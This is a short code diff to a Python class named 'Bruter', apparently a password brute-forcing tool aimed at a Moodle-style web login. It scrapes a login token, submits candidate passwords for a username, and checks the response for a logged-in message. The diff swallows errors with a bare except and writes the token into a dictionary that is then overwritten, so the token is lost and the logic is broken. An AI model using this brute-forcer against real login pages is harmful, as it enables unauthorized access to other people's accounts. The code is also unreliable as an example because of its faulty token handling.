@@ -28,10 +28,13 @@ class Bruter():
                     },
                     verify=False
                 )
-            regex = re.search('name="logintoken" value="(.*?)"', req.text).group(1) 
+            try:
+                regex = re.search('name="logintoken" value="(.*?)"', req.text).group(1) 
+                post_data['logintoken'] = str(regex)
+            except:
+                pass
             post_data = {
                 'anchor': '',
-                'logintoken': str(regex),
                 'username': str(self.uname),
                 'password': str(words)
             }
@@ -45,6 +48,7 @@ class Bruter():
             if "You are logged in as" in post.text:
                 return 'ok'
             else:
+                print(post.text)
                 return 'fail'
         except ConnectionError:
             return 'error'
